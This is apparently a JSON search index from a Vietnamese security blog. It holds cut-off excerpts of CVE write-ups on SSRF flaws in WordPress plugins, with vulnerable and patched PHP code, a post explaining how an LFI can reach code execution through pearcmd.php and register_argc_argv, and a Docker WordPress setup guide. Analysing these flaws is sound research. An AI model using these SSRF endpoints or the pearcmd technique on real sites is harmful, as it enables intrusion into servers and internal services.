[{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress PopupKit Plugin.","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin Popup Builder with Gamification, Multi-Step Popups, Page-Level Targeting, and WooCommerce Triggers cho WordPress t·ªìn t·∫°i l·ªó h·ªïng Server-Side Request Forgery (SSRF) trong t·∫•t c·∫£ c√°c phi√™n b·∫£n t·ª´ ƒë·∫ßu ƒë·∫øn 2.1.4 (bao g·ªìm c·∫£ 2.1.4). Nguy√™n nh√¢n l√† do thi·∫øu ki·ªÉm tra h·ª£p l·ªá (insufficient validation) ƒë·ªëi v·ªõi c√°c URL ƒë∆∞·ª£c truy·ªÅn th√¥ng qua tham s·ªë URL. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c (unauthenticated attackers) g·ª≠i c√°c web request ƒë·∫øn ƒë·ªãa ch·ªâ t√πy √Ω xu·∫•t ph√°t t·ª´ ·ª©ng d·ª•ng web, c√≥ th·ªÉ ƒë∆∞·ª£c l·ª£i d·ª•ng ƒë·ªÉ truy v·∫•n ho·∫∑c ch·ªânh s·ª≠a th√¥ng tin t·ª´ c√°c d·ªãch v·ª• n·ªôi b·ªô (internal services), c≈©ng nh∆∞ th·ª±c hi·ªán ho·∫°t ƒë·ªông trinh s√°t m·∫°ng (network reconnaissance). L·ªó h·ªïng n√†y ƒë√£ ƒë∆∞·ª£c v√° m·ªôt ph·∫ßn (partially patched) trong phi√™n b·∫£n 2.1.4. CVE ID: CVE-2025-10861 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.1.4 Patched Versions: 2.1.5 CVSS severity: Medium (7.2) Required Privilege: Unauthenticated Product: WordPress PopupKit Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - PopupKit: 2.1.3 (vulnerable) v√† 2.1.5 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Analysis Patch diff V√¨ 1 ph·∫ßn m√£ ngu·ªìn ƒë√£ ƒë∆∞·ª£c v√° trong phi√™n b·∫£n 2.1.4 n√™n ta s·∫Ω s·ª≠ d·ª•ng phi√™n b·∫£n 2.1.3 ƒë·ªÉ ph√¢n t√≠ch. protected function get_routes(): array { return [ [ 'endpoint' =\u003e '/live-preview', 'methods' =\u003e 'POST', 'callback' =\u003e 'fetch_external_content', 'permission_callback' =\u003e '__return_true', ],... ]; } public function fetch_external_content( \\WP_REST_Request $request ) { $url = $request-\u003eget_param( 'url' ); if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Invalid URL' ), 400 ); } // Fetch the content using wp_remote_get $new_url = add_query_arg( 'preview', 'true', $url ); $response = wp_remote_get( $new_url ); if ( is_wp_error( $response ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Error fetching content' ), 500 ); } // Return the fetched content $body = wp_remote_retrieve_body( $response ); $body = preg_replace( '/type=\"[^\"]+-text\\/javascript\"/', 'type=\"text/javascript\"', $body ); return new \\WP_REST_Response( array( 'content' =\u003e $body ), 200 ); } Trong phi√™n b·∫£n 2.1.3, plugin ƒë·ªãnh nghƒ©a m·ªôt API v·ªõi POST method c√≥ permission_callback =\u003e __return_true, cho ph√©p m·ªçi ng∆∞·ªùi d√πng, bao g·ªìm c·∫£ anonymous user, th·ª±c thi h√†m fetch_external_content() v·ªõi tham s·ªë url b·∫Øt bu·ªôc. H√†m n√†y s·ª≠ d·ª•ng wp_remote_get ƒë·ªÉ g·ª≠i request ƒë·∫øn URL ƒë∆∞·ª£c truy·ªÅn v√†o v√† tr·∫£ l·∫°i n·ªôi dung ph·∫£n h·ªìi (response body). Do kh√¥ng c√≥ b·∫•t k·ª≥ c∆° ch·∫ø ki·ªÉm so√°t ho·∫∑c l·ªçc URL n·ªôi b·ªô n√†o, ƒëi·ªÅu n√†y khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ g·ª≠i request ƒë·∫øn c√°c d·ªãch v·ª• n·ªôi b·ªô (internal services) d·∫´n ƒë·∫øn l·ªó h·ªïng Server-Side Request Forgery (SSRF) c√≥ th·ªÉ khai th√°c b·ªüi anonymous user. protected function get_routes(): array { return [ [ 'endpoint' =\u003e '/live-preview-template', 'methods' =\u003e 'GET', 'callback' =\u003e 'fetch_external_content', ],... ]; } public function fetch_external_content( \\WP_REST_Request $request ) { $url = $request-\u003eget_param( 'url' ); if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Invalid URL' ), 400 ); } // Fetch the content using wp_remote_get $new_url = add_query_arg( 'preview', 'true', $url ); $response = wp_safe_remote_get( $new_url ); if ( is_wp_error( $response ) ) { return new \\WP_REST_Response( array( 'error' =\u003e 'Error fetching content' ), 500 ); } // Return the fetched content $body = wp_remote_retrieve_body( $response ); $body = preg_replace( '/type=\"[^\"]+-text\\/javascript\"/', 'type=\"text/javascript\"', $body ); return new \\WP_REST_Response( array( 'content' =\u003e $body ), 200 ); } Trong b·∫£n v√° 2.1.5, plugin ƒë√£ th·ª±c hi·ªán m·ªôt s·ªë thay ƒë·ªïi nh·∫±m gi·∫£m thi·ªÉu nguy c∆° Server-Side Request Forgery (SSRF): ƒê·ªïi endpoint t·ª´ /live-preview sang /live-preview-template. Thay th·∫ø h√†m wp_remote_get() b·∫±ng wp_safe_remote_get(), gi√∫p WordPress t·ª± ƒë·ªông ch·∫∑n c√°c request","date":"2025-10-27","objectID":"/vi/posts/2025-10-27-cve-2025-10861/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-10861 Analysis \u0026 POC","uri":"/vi/posts/2025-10-27-cve-2025-10861/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Spectra Plugin.","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info L·ªó h·ªïng Server Side Request Forgery (SSRF) ƒë√£ ƒë∆∞·ª£c ph√°t hi·ªán trong plugin WordPress Spectra (tr∆∞·ªõc ƒë√¢y g·ªçi l√† Ultimate Addons cho Gutenberg) ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c phi√™n b·∫£n l√™n t·ªõi 2.6.6. CVE ID: CVE-2023-36679 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.6.6 Patched Versions: 2.6.7 CVSS severity: Low (7.1) Required Privilege: Contributor Product: WordPress Spectra Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Spectra: 2.6.6 (vulnerable) v√† 2.6.7 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Analysis Patch diff B·∫£n l·ªói: public function template_importer() { if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } // Verify Nonce. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); // other logic $api_args = apply_filters( 'ast_block_templates_api_args', array( 'timeout' =\u003e 15, ) ); $api_uri = ( isset( $_REQUEST['api_uri'] ) ) ? esc_url_raw( $_REQUEST['api_uri'] ) : ''; $request_params = apply_filters( 'ast_block_templates_api_params', array( '_fields' =\u003e 'original_content', ) ); $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) ); // API Call. $response = wp_remote_get( $demo_api_uri, $api_args ); // other logic $data = json_decode( wp_remote_retrieve_body( $response ), true ); wp_send_json_success( $data['original_content'] ); } Trong phi√™n b·∫£n 2.6.6, h√†m template_importer() nh·∫≠n tham s·ªë api_uri tr·ª±c ti·∫øp t·ª´ bi·∫øn $_REQUEST v√† s·ª≠ d·ª•ng gi√° tr·ªã n√†y ƒë·ªÉ g·ª≠i HTTP request th√¥ng qua h√†m wp_remote_get(): Do kh√¥ng c√≥ b∆∞·ªõc x√°c th·ª±c ho·∫∑c gi·ªõi h·∫°n ngu·ªìn, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ cung c·∫•p m·ªôt URL t√πy √Ω ƒë·ªÉ √©p m√°y ch·ªß th·ª±c hi·ªán request ƒë·∫øn c√°c ƒë·ªãa ch·ªâ n·ªôi b·ªô. ƒêi·ªÅu n√†y t·∫°o ra l·ªó h·ªïng Server-Side Request Forgery (SSRF). B·∫£n v√°: public function template_importer() { if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } // Verify Nonce. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); // other logic $api_args = apply_filters( 'ast_block_templates_api_args', array( 'timeout' =\u003e 15, ) ); $block_id = isset( $_REQUEST['id'] ) ? absint( $_REQUEST['id'] ) : ''; $block_data = get_option( 'ast-block-templates_data-' . $block_id ); $api_uri = null !== $block_data ? $block_data-\u003e{'astra-page-api-url'} : ''; $request_params = apply_filters( 'ast_block_templates_api_params', array( '_fields' =\u003e 'original_content', ) ); $demo_api_uri = esc_url_raw( add_query_arg( $request_params, $api_uri ) ); // API Call. $response = wp_remote_get( $demo_api_uri, $api_args ); // other logic $data = json_decode( wp_remote_retrieve_body( $response ), true ); wp_send_json_success( $data['original_content'] ); } B·∫£n v√° ƒë√£ lo·∫°i b·ªè vi·ªác nh·∫≠n URL tr·ª±c ti·∫øp t·ª´ ng∆∞·ªùi d√πng. Thay v√†o ƒë√≥, m√£ ch·ªâ nh·∫≠n ID c·ªßa block th√¥ng qua $_REQUEST['id'] v√† truy xu·∫•t URL t∆∞∆°ng ·ª©ng t·ª´ c∆° s·ªü d·ªØ li·ªáu (wp_options) b·∫±ng kh√≥a ast-block-templates_data-{id}: Nh·ªù ƒë√≥, URL ƒë∆∞·ª£c gi·ªõi h·∫°n trong c√°c b·∫£n ghi ƒë∆∞·ª£c qu·∫£n l√Ω s·∫µn trong h·ªá th·ªëng, lo·∫°i b·ªè kh·∫£ nƒÉng ng∆∞·ªùi d√πng t·ª± cung c·∫•p ƒë∆∞·ªùng d·∫´n t√πy √Ω. C∆° ch·∫ø n√†y gi√∫p ngƒÉn ch·∫∑n ho√†n to√†n nguy c∆° SSRF v√† tƒÉng t√≠nh an to√†n khi g·ªçi API t·ª´ ph√≠a m√°y ch·ªß. Vulnerable Code template_importer() y√™u c·∫ßu ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c quy·ªÅn t·ª´ Contributor tr·ªü l√™n if ( ! current_user_can( 'edit_posts' ) ) { wp_send_json_error( __( 'You are not allowed to perform this action', 'astra-sites' ) ); } X√°c th·ª±c nonce ch·ªëng csrf v·ªõi t√™n nonce l√† _ajax_nonce, n·∫øu nonce kh√¥ng kh·ªõp =\u003e tho√°t kh·ªèi logic v√† g·ª≠i l·ªói. check_ajax_referer( 'ast-block-templates-ajax-nonce', '_ajax_nonce' ); M·∫πo L·ªó h·ªïng ƒë∆∞·ª£c c√¥ng b·ªë y√™u c·∫ßu ƒë·∫∑c quy·ªÅn Contributor, n√™n gi√° tr·ªã _ajax_nonce r·∫•t c√≥ kh·∫£ nƒÉng xu·∫•t hi·ªán trong m√£ ngu·ªìn giao di·ªán Admin. V·ªõi c√°c l·ªó h·ªïng li√™n quan t·ªõi quy·ªÅn Contributor th∆∞·ªùng g·∫Øn v·ªõi ch·ª©c nƒÉng t·∫°o b√†i vi·∫øt, b·∫°n c√≥ th·ªÉ t√¨m _ajax_n","date":"2025-10-23","objectID":"/vi/posts/2025-10-23-cve-2023-36679/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2023-36679 Analysis \u0026 POC","uri":"/vi/posts/2025-10-23-cve-2023-36679/"},{"categories":["CVE Analyst"],"content":"Technical analysis and proof-of-concept demonstrating an LFI bypass (forced .php suffix) leveraging pearcmd.php","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/"},{"categories":["CVE Analyst"],"content":"Xin ch√†o. Sau khi ph√¢n t√≠ch 10 CVE li√™n quan ƒë·∫øn LFI tr√™n c√°c plugin WordPress, t√¥i nh·∫≠n th·∫•y m·ªôt r√†o c·∫£n chung: nhi·ªÅu vector khai th√°c b·ªã gi·ªõi h·∫°n b·ªüi y√™u c·∫ßu ph·∫£i c√≥ h·∫≠u t·ªë .php. ƒêi·ªÅu n√†y l√†m gi·∫£m ƒë√°ng k·ªÉ kh·∫£ nƒÉng khai th√°c. Trong qu√° tr√¨nh t√¨m hi·ªÉu, t√¥i t√¨m th·∫•y b√†i vi·∫øt docker-php-include-getshell. B√†i ƒë√≥ m√¥ t·∫£ c√°ch bypass r√†ng bu·ªôc .php b·∫±ng c√°ch l·ª£i d·ª•ng file pearcmd.php v·ªën n·∫±m trong b·ªô c√¥ng c·ª• PECL/PEAR c·ªßa PHP v√† c√≥ s·∫µn trong m√¥i tr∆∞·ªùng WordPress ƒë∆∞·ª£c tri·ªÉn khai tr√™n Docker - m·ªôt m·∫πo r·∫•t th·ª±c t·∫ø cho k·ªãch b·∫£n kh√¥ng cho upload file. PEAR v√† PECL l√† g√¨? PECL (PHP Extension Community Library): c√¥ng c·ª• d√≤ng l·ªánh ƒë·ªÉ c√†i v√† qu·∫£n l√Ω extension PHP. PEAR (PHP Extension and Application Repository): th∆∞ vi·ªán n·ªÅn t·∫£ng cho PECL. Tr∆∞·ªõc PHP 7.3, PEAR/PECL th∆∞·ªùng ƒë∆∞·ª£c c√†i m·∫∑c ƒë·ªãnh. T·ª´ PHP 7.4 tr·ªü ƒëi, c·∫ßn bi√™n d·ªãch PHP v·ªõi --with-pear ƒë·ªÉ c√≥ ch√∫ng. Tuy nhi√™n, trong c√°c Docker image PHP ch√≠nh th·ª©c, PEAR/PECL v·∫´n th∆∞·ªùng ƒë∆∞·ª£c c√†i s·∫µn, n·∫±m ·ªü /usr/local/lib/php: root@e182501c47c4:/var/www/html# ls /usr/local/lib/php Archive Console OS PEAR PEAR.php Structures System.php XML build data doc extensions pearcmd.php peclcmd.php test pearcmd.php v√† register_argc_argv pearcmd.php l√† m·ªôt script PHP thi·∫øt k·∫ø ƒë·ªÉ ch·∫°y ·ªü ch·∫ø ƒë·ªô d√≤ng l·ªánh, v√≠ d·ª•: php /usr/local/lib/php/pearcmd.php install somepackage N√≥ x·ª≠ l√Ω c√°c tham s·ªë t·ª´ $argv v√† $argc. Khi ch·∫°y nh∆∞ CLI th√¨ d·ªØ li·ªáu n√†y r√µ r√†ng. N·∫øu file n√†y ƒë∆∞·ª£c include trong b·ªëi c·∫£nh web (do LFI), logic CLI c·ªßa n√≥ c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng. ƒêi·ªÉm then ch·ªët l√† c·∫•u h√¨nh register_argc_argv. N·∫øu register_argc_argv = On, PHP s·∫Ω t·∫°o: $argc $argv $_SERVER['argv'] `argv` trong c·∫•u h√¨nh PHP Khi thi·∫øt l·∫≠p WordPress tr√™n Docker, register_argc_argv th∆∞·ªùng b·∫≠t m·∫∑c ƒë·ªãnh. V·∫•n ƒë·ªÅ ƒë·∫∑t ra: khi PHP ch·∫°y d∆∞·ªõi SAPI web (FPM/Apache) v√† kh√¥ng ph·∫£i CLI, $argv l·∫•y d·ªØ li·ªáu t·ª´ ƒë√¢u? Analysis PHP Source Code Trong PHP core c√≥ logic nh∆∞ sau: if (PG(register_argc_argv)) { if (SG(request_info).argc) { ... } else { php_build_argv(SG(request_info).query_string, \u0026PG(http_globals)[TRACK_VARS_SERVER]); } } N·∫øu kh√¥ng c√≥ argc (kh√¥ng ch·∫°y CLI), PHP g·ªçi php_build_argv v·ªõi SG(request_info).query_string - t·ª©c query string c·ªßa URL. V√≠ d·ª•: http://example.com/index.php?a=b\u0026c=d ‚Üí query_string = \"a=b\u0026c=d\" PHP s·∫Ω d√πng query string n√†y ƒë·ªÉ t·∫°o bi·∫øn argv, do ƒë√≥ $_SERVER['argv'] c√≥ th·ªÉ b·ªã ·∫£nh h∆∞·ªüng b·ªüi query string. H·∫≠u qu·∫£: Khi pearcmd.php ƒë∆∞·ª£c include qua LFI trong m√¥i tr∆∞·ªùng web m√† $_SERVER['argv'] ƒë∆∞·ª£c sinh t·ª´ query string, attacker c√≥ th·ªÉ ƒëi·ªÅu khi·ªÉn c√°c tham s·ªë d√≤ng l·ªánh m√† pearcmd.php ƒë·ªçc ƒë∆∞·ª£c. Do ƒë√≥, ch·ª©c nƒÉng d√≤ng l·ªánh c·ªßa PEAR/PECL c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng qua web ƒë·ªÉ th·ª±c hi·ªán h√†nh ƒë·ªông kh√¥ng mong mu·ªën. RFC3875 Explain RFC3875 (CGI spec) ƒë·ªãnh nghƒ©a m·ªôt d·∫°ng ‚Äúindexed‚Äù HTTP query - t·ª©c l√† chu·ªói truy v·∫•n kh√¥ng ch·ª©a d·∫•u = ch∆∞a m√£ h√≥a v√† ƒë∆∞·ª£c g·ª≠i qua ph∆∞∆°ng th·ª©c GET ho·∫∑c HEAD. Khi g·∫∑p lo·∫°i truy v·∫•n n√†y, server n√™n (SHOULD) coi ph·∫ßn query-string nh∆∞ m·ªôt search-string, t√°ch th√†nh c√°c search-word b·∫±ng d·∫•u +: search-string = search-word ( \"+\" search-word ) search-word = 1*schar Sau khi t√°ch, m·ªói search-word s·∫Ω ƒë∆∞·ª£c URL-decode, c√≥ th·ªÉ m√£ h√≥a l·∫°i theo h·ªá th·ªëng, r·ªìi th√™m v√†o danh s√°ch ƒë·ªëi s·ªë d√≤ng l·ªánh (argv) c·ªßa ch∆∞∆°ng tr√¨nh CGI. N√≥i ng·∫Øn g·ªçn: n·∫øu query-string kh√¥ng c√≥ d·∫•u = v√† l√† y√™u c·∫ßu GET ho·∫∑c HEAD, m√°y ch·ªß c√≥ th·ªÉ coi c√°c ph·∫ßn ngƒÉn c√°ch b·∫±ng + nh∆∞ c√°c tham s·ªë d√≤ng l·ªánh v√† truy·ªÅn v√†o argv. RFC3875 cho ph√©p server bi·∫øn m·ªôt query-string ‚Äúindexed‚Äù (GET/HEAD, kh√¥ng c√≥ k√Ω t·ª± = ch∆∞a m√£ h√≥a) th√†nh danh s√°ch t·ª´, r·ªìi ƒë∆∞a v√†o argv. Ph·∫ßn m√¥ t·∫£ trong ti√™u chu·∫©n nh∆∞ sau: 4.4. The Script Command Line Some systems support a method for supplying an array of strings to the CGI script. This is only used in the case of an 'indexed' HTTP query, which is identified by a 'GET' or 'HEAD' request with a URI query string that does not contain any unencoded \"=\" characters. For such a request, the server SHOULD treat the query-string as a search-string and parse it into words, using the rules search-string = search-word ( \"+\" search-word ) search-word = 1*schar schar = unreserved | escaped | xreserved xreserv","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/:0:0","tags":["analyst","lfi","plugin","pearcmd"],"title":"Exploiting LFI2RCE Vulnerability via PHP PEARCMD","uri":"/vi/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Essential Blocks for Gutenberg Plugin.","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin Gutenberg Essential Blocks ‚Äì Page Builder for Gutenberg Blocks \u0026 Patterns cho WordPress b·ªã l·ªó h·ªïng Server-Side Request Forgery (SSRF) trong t·∫•t c·∫£ c√°c phi√™n b·∫£n l√™n t·ªõi v√† bao g·ªìm 5.7.1, th√¥ng qua h√†m eb_save_ai_generated_image. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c, c√≥ quy·ªÅn Author-level tr·ªü l√™n, th·ª±c hi·ªán c√°c y√™u c·∫ßu web t·ªõi b·∫•t k·ª≥ ƒë·ªãa ch·ªâ n√†o xu·∫•t ph√°t t·ª´ ·ª©ng d·ª•ng web v√† c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ truy v·∫•n v√† ch·ªânh s·ª≠a th√¥ng tin t·ª´ c√°c d·ªãch v·ª• n·ªôi b·ªô. CVE ID: CVE-2025-11361 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.7.1 Patched Versions: 5.7.2 CVSS severity: Low (5.5) Required Privilege: Author Product: WordPress Essential Blocks for Gutenberg Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Essential Blocks for Gutenberg: 5.7.1 (vulnerable) v√† 5.7.2 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Analysis Patch diff B·∫£n l·ªói: public function eb_save_ai_generated_image() { if ( ! isset( $_POST[ 'admin_nonce' ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ 'admin_nonce' ] ), 'admin-nonce' ) ) { wp_send_json_error( __( 'Nonce Error', 'essential-blocks' ) ); } if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( __( 'You are not authorized to upload files!', 'essential-blocks' ) ); } // Check if we have either image_url or image_b64 along with prompt if ( ( isset( $_POST[ 'image_url' ] ) || isset( $_POST[ 'image_b64' ] ) ) \u0026\u0026 isset( $_POST[ 'prompt' ] ) ) { $image_url = isset( $_POST[ 'image_url' ] ) ? esc_url_raw( $_POST[ 'image_url' ] ) : null; $image_body = ''; // Handle URL format if ( $image_url ) { // Download the image from OpenAI URL $image_data = wp_remote_get( $image_url, [ 'timeout' =\u003e 60 ] ); if ( is_wp_error( $image_data ) ) { wp_send_json_error( [ 'message' =\u003e __( 'Failed to download image from OpenAI.', 'essential-blocks' ) ] ); return; } // Detect image format and set appropriate extension and MIME type $image_info = getimagesizefromstring( $image_body ); $mime_type = $image_info ? $image_info[ 'mime' ] : 'image/png'; // Determine file extension based on MIME type $extension = 'png'; // default switch ( $mime_type ) { case 'image/jpeg': $extension = 'jpg'; break; case 'image/png': $extension = 'png'; break; case 'image/webp': $extension = 'webp'; break; case 'image/gif': $extension = 'gif'; break; } $image_body = wp_remote_retrieve_body( $image_data ); } // other logic } else { wp_send_json_error( __( 'Image data (URL or base64) and prompt are required', 'essential-blocks' ) ); } } Trong phi√™n b·∫£n l·ªói, s·ª≠ d·ª•ng wp_remote_get($image_url) ƒë·ªÉ t·∫£i h√¨nh ·∫£nh m√† kh√¥ng x√°c th·ª±c ho·∫∑c gi·ªõi h·∫°n ngu·ªìn URL. Kh√¥ng ki·ªÉm tra m√£ ph·∫£n h·ªìi HTTP, MIME type hay n·ªôi dung th·ª±c t·∫ø c·ªßa t·ªáp tr·∫£ v·ªÅ, khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng g·ª≠i y√™u c·∫ßu SSRF ƒë·∫øn c√°c d·ªãch v·ª• n·ªôi b·ªô ho·∫∑c t·∫£i v·ªÅ d·ªØ li·ªáu ƒë·ªôc h·∫°i gi·∫£ d·∫°ng h√¨nh ·∫£nh. B·∫£n v√°: public function eb_save_ai_generated_image() { if ( ! isset( $_POST[ 'admin_nonce' ] ) || ! wp_verify_nonce( sanitize_key( $_POST[ 'admin_nonce' ] ), 'admin-nonce' ) ) { wp_send_json_error( __( 'Nonce Error', 'essential-blocks' ) ); } if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( __( 'You are not authorized to upload files!', 'essential-blocks' ) ); } // Check if we have either image_url or image_b64 along with prompt if ( ( isset( $_POST[ 'image_url' ] ) || isset( $_POST[ 'image_b64' ] ) ) \u0026\u0026 isset( $_POST[ 'prompt' ] ) ) { $image_url = isset( $_POST[ 'image_url' ] ) ? esc_url_raw( $_POST[ 'image_url' ] ) : null; $image_body = ''; // Handle URL format if ( $image_url ) { // Download the image from validated URL $image_data = wp_safe_remote_get( $image_url, [ 'timeout' =\u003e 30, 'redirection' =\u003e 3, 'user-agent' =\u003e 'Essential Blocks/' . ESSENTIAL_BLOCKS_VERSION, 'headers' =\u003e [ 'Accept' =\u003e 'image/*' ] ] ); if ( is_wp_error( $image_data ) ) { wp_send_json_error( [ 'message' =\u003e __( 'Failed to download image from URL","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-cve-2025-11361/:0:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11361 Analysis \u0026 POC","uri":"/vi/posts/2025-10-22-cve-2025-11361/"},{"categories":["Web"],"content":"A powerful and the most popular content management system (CMS).","date":"2025-10-22","objectID":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/","tags":["cms","php","wordpress","docker"],"title":"WordPress Local and Debugging in Docker","uri":"/vi/posts/2025-10-22-wordpress-local-and-debugging-docker/"},{"categories":["Web"],"content":"Ti·∫øp n·ªëi ph·∫ßn h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t WordPress tr√™n m√¥i tr∆∞·ªùng local ·ªü b√†i vi·∫øt tr∆∞·ªõc, b√†i n√†y s·∫Ω h∆∞·ªõng d·∫´n b·∫°n thi·∫øt l·∫≠p WordPress b·∫±ng Docker ‚Äî m·ªôt c√°ch hi·ªán ƒë·∫°i, linh ho·∫°t v√† d·ªÖ chia s·∫ª h∆°n. Why Use Docker? Docker cho ph√©p b·∫°n ƒë√≥ng g√≥i to√†n b·ªô m√¥i tr∆∞·ªùng ch·∫°y WordPress (PHP, MySQL, web server v√† m√£ ngu·ªìn) v√†o c√°c container ƒë·ªôc l·∫≠p. C√°ch l√†m n√†y mang l·∫°i nhi·ªÅu l·ª£i √≠ch: ƒê·ªìng nh·∫•t m√¥i tr∆∞·ªùng: Ch·∫°y gi·ªëng nhau tr√™n m·ªçi m√°y, tr√°nh l·ªói ‚Äúch·∫°y ƒë∆∞·ª£c tr√™n m√°y t√¥i‚Äù. D·ªÖ c√†i ƒë·∫∑t v√† t√°i t·∫°o: Ch·ªâ c·∫ßn v√†i l·ªánh ƒë·ªÉ kh·ªüi t·∫°o ho·∫∑c reset to√†n b·ªô h·ªá th·ªëng. C√°ch ly v√† an to√†n: M·ªói container l√† m·ªôt m√¥i tr∆∞·ªùng ri√™ng, tr√°nh xung ƒë·ªôt ph·∫ßn m·ªÅm. Thu·∫≠n ti·ªán cho ph√°t tri·ªÉn v√† debug: C√≥ th·ªÉ b·∫≠t Xdebug, theo d√µi log, ho·∫∑c ch·ªânh PHP m√† kh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn h·ªá th·ªëng ch√≠nh. D·ªÖ chia s·∫ª: Ch·ªâ c·∫ßn g·ª≠i file docker-compose.yml v√† c√°c file c·∫•u h√¨nh, ng∆∞·ªùi kh√°c c√≥ th·ªÉ kh·ªüi ch·∫°y c√πng m√¥i tr∆∞·ªùng gi·ªëng b·∫°n ‚Äî kh√¥ng c·∫ßn c√†i ƒë·∫∑t th·ªß c√¥ng. Docker l√† gi·∫£i ph√°p t·ªëi ∆∞u ƒë·ªÉ ph√°t tri·ªÉn, th·ª≠ nghi·ªám v√† c·ªông t√°c tr√™n c√°c d·ª± √°n WordPress, ƒë·∫∑c bi·ªát h·ªØu √≠ch cho l·∫≠p tr√¨nh vi√™n, nh√≥m l√†m vi·ªác ho·∫∑c ng∆∞·ªùi l√†m pentest mu·ªën c√≥ m√¥i tr∆∞·ªùng nh·∫•t qu√°n, d·ªÖ t√°i s·ª≠ d·ª•ng. Setup WordPress for Hacker in Docker Prerequisites Docker Tr∆∞·ªõc ti√™n, b·∫°n c·∫ßn c√†i ƒë·∫∑t Docker. C√¥ng c·ª• n√†y h·ªó tr·ª£ tr√™n nhi·ªÅu h·ªá ƒëi·ªÅu h√†nh, m·ªói n·ªÅn t·∫£ng c√≥ c√°ch c√†i ƒë·∫∑t ri√™ng. Xem h∆∞·ªõng d·∫´n t·∫°i: https://www.docker.com/get-started/ Docker Compose Thay v√¨ ch·∫°y t·ª´ng container th·ªß c√¥ng b·∫±ng docker run, ta d√πng Docker Compose ƒë·ªÉ ƒë·ªãnh nghƒ©a v√† qu·∫£n l√Ω nhi·ªÅu container li√™n k·∫øt ch·ªâ b·∫±ng m·ªôt file c·∫•u h√¨nh duy nh·∫•t (docker-compose.yml). V·ªõi WordPress, ta c·∫ßn: M·ªôt container MySQL ƒë·ªÉ l∆∞u c∆° s·ªü d·ªØ li·ªáu. M·ªôt container WordPress (PHP + web server) ƒë·ªÉ ch·∫°y m√£ ngu·ªìn. N·∫øu l√†m th·ªß c√¥ng, b·∫°n s·∫Ω ph·∫£i nh·∫≠p nhi·ªÅu l·ªánh v√† c·∫•u h√¨nh 